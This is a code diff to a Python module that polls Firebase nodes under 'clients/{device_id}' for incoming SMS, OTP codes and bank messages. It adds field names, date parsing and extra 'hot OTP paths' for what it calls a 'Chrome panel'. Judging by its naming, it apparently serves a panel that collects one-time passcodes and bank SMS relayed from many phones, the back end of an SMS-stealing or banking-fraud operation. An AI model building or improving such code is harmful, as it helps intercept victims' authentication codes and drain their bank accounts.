@@ -60,6 +60,9 @@ BODY_FIELDS = (
     "smsText",
     "sms_text",
     "messageBody",
+    "msgText",
+    "msgBody",
+    "smsMessage",
     "otp",
     "code",
 )
@@ -74,7 +77,18 @@ SINGLETON_SMS_SUFFIXES = (
     "/webhookEvent/newSms",
     "/webhookEvent/smsIn",
 )
-TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
+TIME_FIELDS = (
+    "time",
+    "date",
+    "timestamp",
+    "ts",
+    "received_at",
+    "created_at",
+    "createdAt",
+    "smsTime",
+    "receivedDate",
+    "createdDate",
+)
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
@@ -194,6 +208,30 @@ def clear_sms_baseline(device: Device) -> None:
 
 def _parse_body_date(text: str) -> datetime | None:
     raw = (text or "").strip()
+    comma_match = re.search(
+        r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})\s*,\s*(\d{1,2}):(\d{2})\s*(am|pm)?\b",
+        raw,
+        re.I,
+    )
+    if comma_match:
+        day, month, year = (
+            int(comma_match.group(1)),
+            int(comma_match.group(2)),
+            int(comma_match.group(3)),
+        )
+        if year < 100:
+            year += 2000
+        hour, minute = int(comma_match.group(4)), int(comma_match.group(5))
+        ampm = (comma_match.group(6) or "").lower()
+        if ampm == "pm" and hour < 12:
+            hour += 12
+        if ampm == "am" and hour == 12:
+            hour = 0
+        try:
+            return datetime(year, month, day, hour, minute, tzinfo=timezone.utc)
+        except ValueError:
+            return None
+
     panel_match = re.search(
         r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{2,4})\s*(?:\||-)\s*(\d{1,2}):(\d{2})\s*(am|pm)?\b",
         raw,
@@ -245,9 +283,28 @@ def _record_dedup_key(record: dict[str, Any]) -> str:
     return firebase_key
 
 
+def _is_sms_list_path(firebase_key: str) -> bool:
+    """Push-id SMS under sms/SMS/bank/messages — use seen-set, not timestamp."""
+    key = (firebase_key or "").lower()
+    return any(
+        token in key
+        for token in (
+            "/sms/",
+            "/smslist/",
+            "/messages/",
+            "/inbox/",
+            "/bank/",
+            "/banksms/",
+        )
+    )
+
+
 def _is_old_for_monitoring(record: dict[str, Any], profile: MonitorProfile) -> bool:
     """Skip Firebase backlog — only SMS at/after monitoring start."""
-    if _is_singleton_sms_path(str(record.get("firebase_key") or "")):
+    firebase_key = str(record.get("firebase_key") or "")
+    if _is_singleton_sms_path(firebase_key):
+        return False
+    if _is_sms_list_path(firebase_key):
         return False
 
     started = profile.started_at
@@ -641,32 +698,37 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
 
 
 def _build_otp_sidecar_paths(device: Device) -> list[str]:
-    """Hot OTP paths — lastSms + webhook incoming (same panel as channel sendSms)."""
+    """Hot OTP paths — full device node + sms list (Chrome panel 150 SMS tab)."""
     sidecar: list[str] = []
     for device_id in _device_ids(device):
         sidecar.extend(
             [
+                f"clients/{device_id}",
                 f"clients/{device_id}/lastSms",
                 f"clients/{device_id}/otp",
                 f"clients/{device_id}/sms",
+                f"clients/{device_id}/SMS",
+                f"clients/{device_id}/bank",
+                f"clients/{device_id}/bankSms",
+                f"clients/{device_id}/smsList",
                 f"clients/{device_id}/webhookEvent/receiveSms",
                 f"clients/{device_id}/webhookEvent/incomingSms",
-                f"clients/{device_id}/webhookEvent/newSms",
                 f"clients/{device_id}/webhookEvent",
             ]
         )
     if device.firebase_key:
         fk = device.firebase_key.strip("/")
-        sidecar.extend(
-            [
-                f"{fk}/lastSms",
-                f"{fk}/otp",
-                f"{fk}/sms",
-                f"{fk}/webhookEvent/receiveSms",
-                f"{fk}/webhookEvent",
-            ]
-        )
-    return list(dict.fromkeys(sidecar))[:10]
+        if not fk.startswith("clients/"):
+            sidecar.extend(
+                [
+                    f"clients/{fk}",
+                    f"clients/{fk}/sms",
+                    f"clients/{fk}/SMS",
+                    f"clients/{fk}/lastSms",
+                ]
+            )
+        sidecar.extend([f"{fk}/lastSms", f"{fk}/sms", f"{fk}/SMS", f"{fk}/otp"])
+    return list(dict.fromkeys(sidecar))[:12]
 
 
 _poll_cycle: dict[int, int] = {}
